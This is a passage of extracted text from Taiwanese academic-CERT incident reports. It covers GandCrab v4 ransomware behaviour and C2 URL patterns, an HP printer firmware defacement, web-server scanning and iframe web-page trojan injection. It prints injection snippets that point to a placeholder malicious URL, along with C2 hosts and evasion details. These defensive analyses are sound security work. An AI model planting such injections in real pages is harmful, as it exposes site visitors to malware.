臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 檢視連線三台學術網路內主機的封包內容,發現其中兩個台主機的封包內容 一致,從封包內容可以看到Let’s Encrypt(讓我們加密吧!)的用字,推測受害 主機連線至這些主機,可能去下載加密工具回來主機內執行加密。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 檢視GC43.exe 之程式原始碼,發現到該程式有一份已寫死的網站名單,提供 受害主機連線至這些網站。如果連線成功,則傳送已被加密的受害主機資訊 與GandCrab 資訊給對方,如IP 位置、",
        "Page_Num": "3,4,5,6"
    },
    "121": {
        "File_Name": "個案分析-GandCrab勒索病毒攻擊事件分析報告_10709.pdf",
        "content": "使用者名稱、電腦名稱、網域名稱、 防毒軟體資訊、作業系統名稱、是否使用俄文輸入、GandCrab 的id、GandCrab 的版本...等等,而其網址由一個特殊格式組成如下: http://{host}/{word1}/{word2}/{fname}.{extension}。 項目 內容 {host} 受感染主機群網址 {word1} wp-content、static、content、includes、data、uploads、news {word2} images、pictures、image、graphic、assets、pics、imgs、tmp {fname} im、de、ka、ke、am、es、so、fu、se、da、he、ru、me、mo、th、 zu {extension} jpg、png、gif、bmp  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 在{host}內容部分可以看到GandCrab 病毒包含一個非常長的硬編碼列表,該列 表內容為它所連接的受感染網站,網站數量為約近千個獨立主機。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team GandCrab 病毒會從上面的地址清單中選擇一個{host}網址,並使用以下單詞 {word1}之一創建隨機的路徑,{word1}內容有wp-content、static、content、 includes、data、uploads 與news 等。 然後再選擇一個單詞{word2}添加在URL 後面,{word2}內容有images、pictures、 image、graphic、assets、pics、imgs 與tmp 等。 之後再從下面的文檔名{fname}列表中隨機選擇幾個組合成文檔名,相應的文檔 名組合列表如下:im、de、ka、ke、am、es、so、fu、se、da、he、ru、me、mo、 th 與zu 等。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 再把前面的URL 與隨機選擇的擴展名{extension}連接起來,隨機的擴展名列表 如下:jpg、png、",
        "Page_Num": "6,7,8,9"
    },
    "122": {
        "File_Name": "個案分析-GandCrab勒索病毒攻擊事件分析報告_10709.pdf",
        "content": "gif 與bmp。 最後會使用POST 的方式發送HTTP 請求到之前拼接出來的網站。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 查看程式GC43.exe 連線已寫死的網站網址的封包內容,發現受害主機確實有 連線到該網站名單的第一個網址www.billerimpex.com,但是並未成功,之後 陸續連線一些網址,但大部分都未成功,不過也有少許連線成功的。 下面為連線成功的案例,所連線的網址分別如下: 「abidhandicraft.com/includes/images/kadehe.jpg」、 「hoteltravel2018.com/news/graphic/zuim.bmp」與 「conthoi.ga/news/assets/heruke.gif」 ,檢視其網址構造可以很清楚看到其符合前面所提到的特別URL 命名規則  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (http://{host}/{word1}/{word2}/{fname}.{extension})。 從案例「hoteltravel2018.com/news/graphic/zuim.bmp」的連線成功頁面,可以發 現到網頁被嵌入自動全螢幕播放的youtube 影片與出現「HACKED BY turk_firestorm」等用字,可見該網站主機已被駭客駭入。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 從「conthoi.ga/news/assets/heruke.gif」的連線成功頁面,可以看到出現一段字告 訴使用者,當你看到該網頁時你的主機可能已感染病毒,建議使用者盡快掃毒, 可見該連線網站之主機也已被駭入而感染病毒。 因為受害主機對網址「www.perfectfunnelblueprint.com」連線成功,故開啟該網 頁檢視其網頁內容,但瀏覽器卻出現該網站為詐騙網站之警告訊息,可見此網站 為惡意網站。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 檢視背景程式執行情形,發現GC43.exe 執行後會呼叫wmic.exe 來執行影子",
        "Page_Num": "9,10,11,12,13"
    },
    "123": {
        "File_Name": "個案分析-GandCrab勒索病毒攻擊事件分析報告_10709.pdf",
        "content": "副本刪除的動作。 另外,從GC43.exe 的程式原始碼也可以得知,加密完成之後,會通過 ShellExecuteW 函數調用wmic.exe 程序,來刪除影子副本。  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 在GC43.exe 執行後,除了C:\\Windows 與C:\\ProgramFiles 的資料夾外,皆被 放入一個名為「KRAB-DECRYPT.txt」的檔案在資料夾中。 9. 檢視KRAB-DECRYPT.txt 的內容,發現此為GANDCRAD V4 的勒索通知信, 信中告訴受害者主機內所有檔案、圖片與資料庫等的資料已被加密,而且副 檔名為.KRAB。受害者可以透過TOR 的瀏覽器開啟如何支付贖金的說明網 頁,也提到可以免費解密一個檔案。在信中可以看到GRANDCRAB 加密密 鑰與受害主機的資料內容。 10. 依照KRAB-DECRYPT.txt 所提的方式,使用TOR 的瀏覽器開啟如何支付贖 金的說明網頁,發現到下面內容。 (1) Tor 瀏覽器開啟後輸入駭客要求輸入的網址。  14 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (2) 被要求上傳KRAB-DECRYPT.txt 文字檔來進行授權,此授權動作之頁 面僅在第一次連線時出現,之後輸入網址就直接到勒索計時的畫面。 (3) 授權完成後,出現可切換8 種國家語言的如何支付贖金的說明網頁,在 頁面中告訴受害者你的檔案已被加密,如果要解密,需在4 天內支付美金 499 元,如過了4 天未支付贖金來購買解密器,則金額會變成兩倍。  15 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (4) 查看What the matter?的內容,得知受害者必須用信用卡購買比特幣或 DASH 來支付美金499 元,而且受害者可以免費使用測試解密1 個文件。  16 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team",
        "Page_Num": "13,14,15,16,17"
    },
    "124": {
        "File_Name": "個案分析-GandCrab勒索病毒攻擊事件分析報告_10709.pdf",
        "content": "(5) 在Buy GandCrab Decryptor 頁面,清楚告訴受害者可以選擇以DASH 或 比特幣支付贖金,也提供贖金要發送到的地址資訊。 (6) 測試免費上傳檔案進行解密之效果,發現檔案上傳後會出現狀態 Pending 的情況,無法馬上將檔案解密。在經過一段時間後返回頁面查看, 發現原先上傳測試解密是否成功的檔案可以下載並成功被開啟。  17 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (7) 當支付贖金期限4 天計時結束後,則購買加密器的金額翻倍為美金998 元。 (8) 在以比特幣購買解密器的頁面,發現若以比特幣支付,則會多支付10% 的管理費,而且也發現在DASH 與比特幣這兩個支付說明頁面中,皆有 輸入Promotion Code 來取得優惠價格的設計,但在KRAB-DECRYPT.txt 與Tor 支付說明頁面中皆未提及如何取得Promotion code。  18 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 11. 將KRAB-DECRYPT.txt 與受害主機內一個被加密圖檔上傳至ID Ransomware 勒索病毒辦別網站 (https://id-ransomware.malwarehunterteam.com),經檢測判定它為GandCrab4 勒索病毒。 12. 檢視受害主機Ruby-PC 內檔案被加密情形,發現主機內除了C:\\Windows 與 C:\\ProgramFiles 的資料夾外,所有檔案皆已被加密,其中包含連接至Scott-PC 之ShareDoc 資料夾的網路磁碟機,可見此GandCrab 病毒會透過區域網路內 的網路分享服務散播。  19 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 另外,檢視GC43.exe 的程式原始碼內容,得知該病毒會加密區域網路內共享 資料夾目錄下的檔案。 13. 檢視Scott-PC 主機內檔案加密情形,發現除了網路磁碟機所用的ShareDoc 資料夾被感染外,無任何其他檔案被加密。在ShareDoc 資料夾中",
        "Page_Num": "17,18,19,20"
    },
    "125": {
        "File_Name": "個案分析-GandCrab勒索病毒攻擊事件分析報告_10709.pdf",
        "content": ",有 Doc1.docx 與檢查清單1.xlsx 兩個檔案之副檔名沒有被更改為.KRAB,檔案仍 然可以開啟,推測沒被加密的原因是因為受害主機在GC43.exe 執行時,仍然 開啟Word 與Excel 執行檔的關係,雖然後來有關閉這些執行檔,但仍有檔案 在那時沒被加密到。  20 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 14. 在登錄檔資料中,發現Salsa20 金鑰與先前生成的RSA-2048 公開金鑰進行 加密後,其加密金鑰儲存成一個二進制,寫入註冊表位置 HKCU\\Software\\keys_data\\data\\private 中,而原始RSA 公開金鑰則儲存在 HKCU\\Software\\keys_data\\data\\public 下。 15. 將程式GC43.exe 經Virustotal 檢測,發現其惡意比例為53/66,而且有許多 家防毒軟體公司稱它為「GandCrab」或「GandCrypt」。  21 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team  22 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 16. 從GC43.exe 之程式原始碼,可以得知該程式會獲取到主機的相關資訊,也 看到此GandCrab 勒索病毒樣本的版本為4.3 版。 另外, 該病毒有繞過ahnlab 疫苗工具的機制,透過發布可能導致Ahnlab V3 Lite 的拒絕服務(DOS)攻擊的概念驗證(POC)源代碼的連結繼續攻擊。 打開該連結的網頁發現它目前已為無效的下載連結,推測該攻擊已被遏止。  23 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 17. 檢視原始碼發現惡意程式會指向Ahnlab 的新模擬字串,該字串包含一個俄 語文本圖像的連結,翻譯為「我已將您添加到我的同性戀列表中。 我暫時使 用了一支鉛筆,」暗示列入名單是暫時的。 18. 檢視GC43.exe 程式碼,發現.lock 的設計",
        "Page_Num": "20,21,22,23,24"
    },
    "126": {
        "File_Name": "個案分析-GandCrab勒索病毒攻擊事件分析報告_10709.pdf",
        "content": ",表示受害主機中若存在.lock 的檔 案,則惡意程式GC43.exe 的執行程序會終止,而不會感染受害主機。  24 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 19. 檢視受害主機Ruby-PC 連線同一區域網路Scott-PC 的封包,發現曾透過SMB 協定,產生過8c8f97e28c8f900a2f.lock 檔案於Scott-PC 內,但是在Ruby-PC 的檔案被加密後,卻在Scott-PC 找不到該檔案,而Scott-PC 也僅有網路連 線磁碟機的檔案被加密,推測Scott-PC 其他資料夾未被感染是因為存 在.lock 檔案而中斷加密作業的散播。  25 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 20. 在GC43.exe 的程式碼中,可以看到「@hashbreaker Daniel J. Bernstein let’s dance salsa<3 @hashbreaker :) )))」的喊話用字,Daniel J.Bernstein 為Salsa 20 演算法的開發者,在此他被放入GandCrab 的喊話名單中。 21. 在GC43.exe 程式碼中,可以看到有使用硬編碼的金鑰「jopochlen」來加密。 22. 檢視GC43.exe 程式碼,得知如果受害主機的作業系統所用輸入法為Russian 俄文輸入法,則不進行檔案加密,反而執行後面的自我刪除動作。  26 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 23. 從GC43.exe 程式碼內容得知,當受害主機的作業系統語言為下面語系時, 則不進行加密,並且執行自我刪除動作,語系列表如下: 419(俄語)、422(烏克蘭語)、423(白俄羅斯語)、428(塔吉克斯坦語)、 42B(亞 美尼亞語)、42C(亞塞拜然語-拉丁文)、437(格魯吉亞語)、43F(哈薩克族語)、 440(吉爾吉斯語)",
        "Page_Num": "24,25,26,27"
    },
    "127": {
        "File_Name": "個案分析-GandCrab勒索病毒攻擊事件分析報告_10709.pdf",
        "content": "、442(土庫曼語)、443(烏茲別克語-拉丁文)、444(韃靼語) 、 818(羅馬尼亞語-摩爾多瓦共和國)、819(俄羅斯-摩爾多瓦共和國)、82C(亞塞 拜然語,西里爾文)、843(烏茲別克語-西里爾文)。  27 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 24. 檢視程式GC43.exe 之程式碼,發現該病毒會搜尋受害主機內是否有安裝防 毒軟體,並且收集防毒軟體的相關資訊。 25. 從GC43.exe 之程式原始碼,可以得知該惡意程式會獲取受害主機相關資 訊,如用户名稱、主機名稱、工作群組、操作系統的語言、操作系統鍵盤輸 入法、操作系統版本類型資訊、CPU 類型及型號資訊、防毒軟體資訊、磁盤 類型及空間資訊。  28 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 26. 檢視GC43.exe 之程式原始碼,發現該病毒會搜尋受害主機內所有資料夾或 網路共享資料夾目錄,如果是以下資料夾目錄,則不進行檔案加密,有 \\ProgramData\\、\\IEIldCache\\、\\Boot\\、\\Program Files\\、\\Tor Browser\\、 \\All Users\\、\\Local Settings\\、\\Windows\\等資料夾。  29 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 27. 檢視GC43.exe 之程式原始碼,發現該病毒在搜尋受害主機內的檔案時,如 果出現以下檔案,則不加密該檔案,不被加密的檔案有desktop.ini、 autorun.inf、ntuser.dat、iconcache.db、bootsect.bak、boot.ini、ntuser.dat.log、 thumbs.db、KRAB-DECRYPT.txt、CRAB-DECRYPT.txt、ntldr、 NTDETECT.COM 與Bootfont.bin 等,推測駭客為防止加密後破壞作業系統的 可用性,故",
        "Page_Num": "27,28,29,30"
    },
    "128": {
        "File_Name": "個案分析-GandCrab勒索病毒攻擊事件分析報告_10709.pdf",
        "content": "設計在加密過程中會跳過這些檔案。  30 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 28. 從GC43.exe 程式碼內容得知,該病毒會將之前生成的勒索資訊寫入到每個 加密後的資料夾下的勒索通知信檔案KRAB-DECRYPT.txt 中。  31 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 29. 下載nomoreransom 的GandCrab 解密器,試著將受害主機內被加密的檔案 解密,但是未成功。目前仍沒有可以成功將GandCrab V4 版所加密的檔案解 密的解密器。 III. 網路架構圖 1. 駭客利用郵件傳遞或駭入網站偽造連結方式來散播GandCrab 病毒。 2. 使用者開啟郵件後執行GandCrab 勒索病毒。 2.1 受害主機對外大量連線一群已被感染的網站。 2.2 關閉常用的應用程式(如Office)。  32 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2.3 利用區域網路內的網路分享服務來散播病毒。 2.4 將private 與public 兩金鑰寫入登錄檔中。 2.5 取得受害主機的相關資訊。 2.6 檢查主機內是否存在.lock 檔,若存在則不加密檔案。 2.7 判斷受害主機輸入法是否為俄文輸入法,若是則不加密檔案。 2.8 判斷受害主機之作業系統所用語言是否來自一些特定國家,若是則不 加密檔案。 2.9 搜尋主機內是否安裝防毒軟體。 2.10 加密檔案並產生勒索通知信。 2.11 不加密主機內某些特定資料夾內檔案與某些特定檔案。 2.12 加密完成後執行wmic.exe 來刪除影子副本。 IV. 建議與總結 1. GandCrab 勒索病毒之版本更新迅速,而受害主機被感染後,該病毒除了 加密檔案外,也會進行一些動作,如搜尋是否有安裝防毒軟體、判斷主機 輸入法是否為俄語體系...,而且該病毒也會一直對外連線已被病毒設定好 的網址名單,試著上傳主機資訊與病毒",
        "Page_Num": "30,31,32,33"
    },
    "129": {
        "File_Name": "個案分析-GandCrab勒索病毒攻擊事件分析報告_10709.pdf",
        "content": "資訊到這些網站,與一般勒索病毒 僅勒索受害者而執行的系統行為與網路行為不同。 2. 根據統計,GandCrab 為2018 年流行的勒索病毒家族,受害者大部分集中 在美國,印度,印尼、巴西與巴基斯坦等國家,而其版本的演化比較如下 表。 版本 V1 V2 V3 V4 出現時間 2018/01 2018/03/05 2018/05/03 2018/07/10i 散播方式 惡意廣告軟體和漏 洞利用工具包 郵件散播 郵件散播 郵件散播、駭入網站 偽造連結方式  33 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 版本 V1 V2 V3 V4 勒索貨幣 DASH DASH 沒有明確指 明 DASH 或BitCoin 副檔名 .GDCB .CRAB .CRAB .KRAB 特色 1.支付1.5 個 DASH 約1200 美 元。 2.已有解密工具可 以解密部分被加密 文件。 1.支付 0.72DASH 約 400 美元。 2.使用帶有資安 公司與警方相 關字串的CC 伺 服器地址 malwarehunterte am.bit,來挑釁 資安人員。 3.透過二維碼取 得付款地址。 1.會替換桌 面背景。 2.執行後會 強制關機, 並同時增加 開機啟動項 目。 3.沒有明確 指定勒索金 額與貨幣類 別。 4.取消二維 條碼功能。 1.支付499 美元.。 2.過了4 天贖金加倍 至998 美元。 3.會搜尋系統中有無 防毒軟體存在。 4.會關閉一些特定的 執行中程式讓加密 順利進行。 3. 目前GandCrab V4 版沒有解密器可將被加密的檔案解密,建議使用者平時 要做好資料備份與不開啟不明來源的檔案,以降低感染該病毒的風險。 V. 相關報導 1. Fortinet:勒索病毒GandCrab 4.0 才推出兩天就釋出4.1, 小心盜版網站的假破解工具 https://www.ithome.com.tw/news/124627  34 臺灣學術",
        "Page_Num": "33,34,35"
    },
    "130": {
        "File_Name": "個案分析-GandCrab勒索病毒攻擊事件分析報告_10709.pdf",
        "content": "網路危機處理中心(TACERT) TANet Computer Emergency Response Team ",
        "Page_Num": "35"
    },
    "131": {
        "File_Name": "個案分析-HP印表機頁面置換個案分析報告.pdf",
        "content": "個案分析- HP 印表機資訊頁面置換 TACERT 臺灣學術網路危機處理中心團隊製 2012/1  2 Taiwan Academic Network Computer emergency Response Team(TACERT) HP 印表機資訊頁面置換事件分析 一、事件發生時間: 2011 年12 月26 日 教育機構資安通報平台派發網頁置換事件單 二、事件通報單位: 系統安全及反駭客團隊(國立清華大學) 三、事件分類: DEF 網頁置換 四、事件影響範圍: 當日發現5 所學校共8 台印表機資訊頁面遭駭客置換頁面 五、事件說明: (一) 當日上午系統安全及反駭客團隊透過教育機構資安通報平台派發共8 張網頁置換事件單。 事件單派發後,接獲轄下單位反應事件單內容派發有問題疑似誤報。 經確認原舉報單位提供之佐證資料,確實為網頁置換事件非誤報,並 檢查確認其他相關事件單,發現此攻擊行為。  3 Taiwan Academic Network Computer emergency Response Team(TACERT) (二) 相關佐證資料: 圖1.受害印表機資訊頁面畫面(圖片由系統安全及反駭客團隊提供) 圖2.受害印表機資訊頁面畫面(圖片由系統安全及反駭客團隊提供)  4 Taiwan Academic Network Computer emergency Response Team(TACERT) 六、分析結果: (一)由圖1及圖2 可發現此網頁置換事件所置換資訊皆為「Hacked By Swan」, 應為同一組織或人員所為。 (二)由圖1 及圖2 可發現此網頁置換事件所受害印表機皆為HP,且皆有網 頁管理功能。 (三)進行相關檢查時發現,受害之印表機韌體皆未進行更新。 (四)TACERT 接收國外First 組織資訊時,發現國外亦有相關攻擊行為及討 論事項且HP 原廠亦公告相關文件。 (五)由HP 原廠公告文件可得知受害型號及解決方法。 參考文件為: 「HPSBPI02728 SSRT100692 rev.5 - Certain HP Printers and HP Digital Senders,",
        "Page_Num": "1,2,3,4"
    },
    "132": {
        "File_Name": "個案分析-HP印表機頁面置換個案分析報告.pdf",
        "content": "Remote Firmware Update Enabled by Default」 (HP 原廠公告文件網址列於參考資料) 七、攻擊手法推測 (一)攻擊目標: HP 公告文件列表之機型且該印表機韌體未進行更新。 (二)攻擊手法: 得知該網頁置換事件時網頁已完成置換,且無法取得置換當時之網路流 量及印表機想關資訊,故只能從HP 原廠公告文件及置換之結果進行推測, 推測結果如下: 1. 遭置換之印表機所使用之IP 皆為公開(Public)IP,可於外部直接連 線,且前端無相關資安設備或未進行控管。 2. 該組織或人員先下載原廠印表機韌體,經修改後,再利用HP 印表機 之系統安全漏洞,透過Port 9100 遠端派送未經授權之印表機韌體進行 安裝,以達到網頁置換之目的。  5 Taiwan Academic Network Computer emergency Response Team(TACERT) 八、應變措施: (一)更新印表機韌體 由HP 原廠公告文件得知要修補該系統安全漏洞需進行印表機韌體更新 作業,各型號之修正建議請參考HP 原廠公告文件。 (HP 原廠公告文件網址列於參考資料) (二)印表機安全性控管 印表機本身如有相關管理介面,皆應有提供系統安全管理選項。建議設 定相關選項,以維護印表機安全管理。 (三)網路端安全性控管 由HP 原廠公告文件中得知,該系統安全漏洞是透過Port 9100 從遠端 派送未經授權之印表機韌體進行安裝。故印表機網路架構前端如有相關 資安設備,可利用此規則進行安全管理。 九、參考資料: (一) HPSBPI02728 SSRT100692 rev.5 - Certain HP Printers and HP Digital Senders, Remote Firmware Update Enabled by Default http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp ?objectID=c03102449 ",
        "Page_Num": "4,5"
    },
    "133": {
        "File_Name": "個案分析-http_windows_executable事件分析報告.pdf",
        "content": "個案分析- HTTP_Windows_Executable 事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2012/4  1 Taiwan Academic Network Computer emergency Response Team(TACERT) 事件說明 K 大學與I 大學,於一個月內連續收到好幾張極為相似的EWA 通知單,相 似處如下列:  攻擊類型皆為HTTP_Windows_Executable  兩個學校被開單的網路位址都在同一個LAN  各自攻擊目標相同  來源埠號都是80 細節如表1 表2 表3 所列: 表1 時間 單位 數量 來源網段 Src_port 攻擊目標 04/06 - 04/07 K 大學 8 192.168.0.0/24 80 66.0.10.113 03/28 - 04/17 I 大學 18 10.0.191.0/24 80 113.135.193.230 K 大學被開單的8 個IP 為: 表2、K 大學 192.168.0.94 192.168.0.61 192.168.0.68 192.168.0.48 192.168.0.88 192.168.0.130 192.168.0.176 192.168.0.195 表3、I 大學 10.0.191.166 10.0.191.28 10.0.191.196 10.0.191.44 10.0.191.31 10.0.191.94 10.0.191.67  2 Taiwan Academic Network Computer emergency Response Team(TACERT) 10.0.191.55 10.0.191.90 10.0.191.153 10.0.191.47 10.0.191.4 10.0.191.16 10.0.191.57 10.0.191.56 10.0.191.20 10.0.191.95 10.0.191.88 這8 台主機皆為架有IIS 的WIN 平台,K 大學網管對八台主機進行掃毒和 檢查,發現電腦裡並無任何惡意程式。八台電腦與66.0.10.113 有連線的時間只 有幾分鐘,由於ASOC 提供的佐證其攻擊行為都是由192.168.0.xxx 的port 80 出 去,所以初步研判可能與主機上的IIS 有關。 在192.168.0.88、192.168.0.130、192.168.0.195 三主機的IIS Log,發現與 66",
        "Page_Num": "1,2,3"
    },
    "134": {
        "File_Name": "個案分析-http_windows_executable事件分析報告.pdf",
        "content": ".0.10.113相關的紀錄顯示,66.0.10.113對此三台主機進行Web Server暴力掃描, 其IIS Log 如圖一、二、三,I 大學的Web Server 也有同樣的log。 圖四則顯示113.135.193.230對10.0.0.0/16網域的多台Web Server進行攻擊。 由這些紀錄可以說明,66.0.10.113 與113.135.193.230 並不是受攻擊的目標,而 是攻擊方。 圖一、192.168.0.88 的IIS Log(由K 大學提供)  3 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖二、192.168.0.130 的IIS Log(由K 大學提供) 圖三、192.168.0.195 的IIS Log(由K 大學提供)  4 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖四、與113.135.193.230 有關的ISS Log(由國網提供) K 大學在192.168.0.0/24 網段架有Honey Pot,偵測到66.0.10.113 對網域進 行掃描之後,便立即對66.0.10.113 進行封鎖的動作,所以開單日期僅有兩天。I 大學在TACERT 告知113.135.193.230 其實是掃描web server 的攻擊者之後,也 對113.135.193.230 進行封鎖。但由於攻擊者只要更換IP,攻擊仍可以實現,在 這個部份只能仰賴網管人員對轄下的網域活動進行偵測。 建議事項  建議發單單位對偵測HTTP_Windows_Executable 攻擊的rule 進行調整  建議學校發現有掃描攻擊出現時,封鎖攻擊者IP,以免洩漏更多網域資訊  對Web Server 的設定進行安全性檢查,避免攻擊者可以改變目錄位置讀取 到系統的命令提示字元  建議重要的Web Server Log 應每天進行檢查 ",
        "Page_Num": "3,4,5"
    },
    "135": {
        "File_Name": "個案分析-iframe網頁掛馬分析報告.pdf",
        "content": "個案分析- Iframe 網頁掛馬分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2012/10  1 Taiwan Academic Network Computer emergency Response Team(TACERT) 前言 網路發展迅速,近年來有許多服務e 化,網路不再僅是獲得資訊的媒介,網路應 用程式的蓬勃發展,使網路變成生活的好幫手,舉凡生活中的大小事,即便不出 門也可以用網路完成一切。由於與生活密不可分,詐騙集團或是不法份子,也隨 之利用網路進行惡意活動,那些被拿來從事惡意活動的網頁統稱為惡意網頁。 有些惡意網頁旨在取得使用者的個人資料,如登入網路服務的帳號密碼,或是使 用者的個資,這類騙取資料的網頁統稱為釣魚網頁。另一些則是在使用者瀏覽網 頁時,在沒有使用者同意的情況下,安裝惡意程式到使用者的主機中,利用使用 者的主機資源從事惡意活動。 第二種類型的惡意網頁,實現方法有很多種,其中網頁掛馬就是其一,合法的網 頁被注入某些網頁碼,使得瀏覽者被重新導向到另外一個惡意網站,或是直接在 使用者瀏覽網頁時,背地裡下載惡意程式。本次的事件分析即是利用網頁掛馬, 將瀏覽者的網頁重新導向。 事件說明  L 國小的部份網頁有自動轉址現象  瀏覽轉址網頁時,小紅傘判定為HTML/Infected.WebPage.Gen3  轉址後的網頁如圖二  放置網頁的主機另外還有FTP 服務,供使用者上傳個人網頁 L 國小的某些網頁,有自動轉址的狀況出現(由圖一的正常網頁轉至圖二的網頁), 有此現象的網頁集中在某個URL 的路徑(http://L.edu.tw/~abc/xxx.htm)之下, 由於蚯蚓符號「~」後面加的字串即為某個使用者的帳號,可以知道該網址路徑 是使用者abc 家目錄,圖一為原本的網頁,圖二為導向之後的網頁。  2 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖一 本來的網頁 圖二 轉址網頁 使用者abc",
        "Page_Num": "1,2,3"
    },
    "136": {
        "File_Name": "個案分析-iframe網頁掛馬分析報告.pdf",
        "content": "家目錄下所有.htm 結尾的網頁,其網頁碼最後一行都被插入iframe 掛馬(如圖四),其語法為 <iframe src=......></iframe>。  3 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖三 該家目錄下面的所有檔案內容 圖四 每個網頁內容最後都有iframe 掛馬 網頁掛馬說明 • Iframe Iframe 是html 語法的一種標籤,用來在網頁中另外內嵌一個網頁。駭客利用這 種簡單的html 語法,將惡意網址隱藏在長寬為0 的iframe 標籤中,使瀏覽者讀 取沒有他們允許的網址。 語法範例: <iframe src=木馬網址 width=0 height=0></iframe> 網頁掛馬有很多種,其他比較常見的還有: • JavaScript – <script type=“text/javascript” src=“惡意js 檔案\"></script> • Body 掛馬 – <body onload=\"window.location='木馬網址';\"></body> 建議措施 從主機的網址,就可以知道它使用家目錄當作個人網頁的放置處,通常這樣設置 的主機也會連帶提供FTP 讓每個使用者可以上傳個人的網頁到主機上。 這些在僅在家目錄abc 底下出現的掛馬網頁,據分析是由於該帳號使用者的FTP 登入密碼被破解,由於蚯蚓符號「~」後為帳號名稱,攻擊者並不需要猜測帳號, 僅需要利用每個蚯蚓符號後的字串去暴力破解FTP 的登入密碼便可。 在事件處理上,由於瀏覽者眾,若有網頁掛馬的情況出現,第一時間建議將主機 下線,暫時停止網頁服務,將主機的更新以及有問題的網頁都處理好之後再上線。  4 Taiwan Academic Network Computer emergency Response Team(TACERT) 由於將使用者家目錄當作網頁目錄的方式,會將帳號名稱於網址列中暴露,使駭 客輕易取得主機的帳號進而猜測密碼,建議限制使用上傳服務的網路位址,設定 僅有校內IP 可以存取FTP 服務。 參考資料 [1] http://www.ithome.com.tw/itadm/article.",
        "Page_Num": "3,4,5"
    },
    "137": {
        "File_Name": "個案分析-iframe網頁掛馬分析報告.pdf",
        "content": "php?c=56649 [2] http://www.ithome.com.tw/itadm/article.php?c=69938 [3] http://www.path8.net/tn/archives/1796 各種掛馬方法介紹 ",
        "Page_Num": "5"
    },
    "138": {
        "File_Name": "個案分析-InfoSteal竊聽程式攻擊事件分析報告_10805.pdf",
        "content": "InfoSteal 竊聽程式攻擊事件 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2019 年5 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 在2019/2 中旬趨勢科技研究員在掃描中國、台灣、義大利與香港的漏洞主機 時,發現一個新型態攻擊工具包結合了木馬與工具來散播挖礦程式與竊取資 料,並且會透過Internet 與區域網路散播自己,下圖為2019/1/22~2019/2/10 中國與台灣每日受感染的主機數量統計。 2. 在成功地侵入受害主機後,多階段的感染過程會使用趨勢科技稱為 Trojan.Win32.INFOSTEAL.ADS 的惡意程式來開始,它將會連線C2 伺服器來 傳送主機資訊,並且下載惡意程式的負載(payload)。 3. 在學術網路內,INFOSTEAL 惡意程式的偵測規則為「MALWARE-CNC Win.Trojan.Fakewmi variant outbound connection attempt」,而且在2019/3 首次 偵測到有18 件資安事件,至2019/4 上升為38 件,整個呈現上升趨勢。 4. 為了瞭解此類型攻擊行為可能造成的影響,本中心取得起始的惡意程式樣本 來進行檢測。 二、事件檢測 1. 首先,使用一台安裝Windows 7 64 位元作業系統的虛擬主機進行隔離環境測  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 試,將樣本InfoSteal.exe(SHA256: bdbfa96d17c2f06f68b3bcc84568cf445915e194f130b0dc2411805cf889b6cc)放於 主機上執行。在執行前,其經Virustotal 檢測之惡意程度為61/70。 2. 程式InfoSteal.exe 在執行後,即於所在的資料夾中消失。觀察主機對外的網 路連線狀況,發現svchost.exe 會對外連線美國IP:23.41.139.27:80,也發現 Process ID 908 與1684 的程式svchost",
        "Page_Num": "1,2,3"
    },
    "139": {
        "File_Name": "個案分析-InfoSteal竊聽程式攻擊事件分析報告_10805.pdf",
